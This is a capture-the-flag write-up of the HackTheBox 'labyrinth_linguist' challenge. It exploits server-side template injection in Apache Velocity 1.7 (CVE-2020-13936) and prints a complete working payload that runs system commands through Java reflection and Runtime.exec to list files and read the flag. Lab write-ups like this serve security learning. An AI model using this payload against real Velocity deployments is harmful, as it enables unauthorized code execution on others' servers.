# Day07 - labyrinth_linguist

- **Platform**: HackTheBox  
- **Category**: Web  
- **Difficulty**: Easy  
- **Date**: 2025-05-07  
- **Tools Used**: BurpSuite, CVE research, Decoder/Proxy/Repeater  

---

## Summary
The challenge involved a Java-based web application using Apache Velocity 1.7. By identifying the version in a leaked `pom.xml` file, I discovered it was vulnerable to SSTI (CVE-2020-13936). Using crafted payloads, I confirmed code execution and ultimately read the `flag.txt` file.

---

## Enumeration
- Accessed the web app and inspected requests through BurpSuite.  
- Examined available files and found `pom.xml`.  
- Confirmed Apache Velocity version 1.7, known to be vulnerable to SSTI (CVE-2020-13936).  
- Tested SSTI using:
  ```velocity
  (#set($a=1+1) $a)
  ```
  which returned `2`, confirming injection.  

---

## Exploitation
- Researched Velocity SSTI payloads to escalate to command execution.  
- Crafted a payload to run system commands:
  ```velocity
  #set($engine="string")
  #set($run=$engine.getClass().forName("java.lang.Runtime"))
  #set($runtime=$run.getRuntime())
  #set($proc=$runtime.exec("ls -al ../"))
  #set($null=$proc.waitFor())
  #set($istr=$proc.getInputStream())
  #set($chr=$engine.getClass().forName("java.lang.Character"))
  #set($output="")
  #set($string=$engine.getClass().forName("java.lang.String"))
  #foreach($i in [1..$istr.available()])
    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
  #end
  $output
  ```
- URL-encoded payload before sending via BurpSuite to avoid breaking the request.  
- Verified ability to list files and then modified payload to read `./flag.txt`.  
- Successfully retrieved the flag.  

---

## Lessons Learned
- Inspecting project configuration files (e.g., `pom.xml`) quickly reveals versions and potential CVEs.  
- SSTI vulnerabilities in template engines can often escalate to full command execution.  
- Encoding payloads properly (URL encoding) is essential for successful delivery in web contexts.  
- Researching public CVE write-ups and payload repositories is a vital skill — knowing when to look is as important as knowing what to test.  
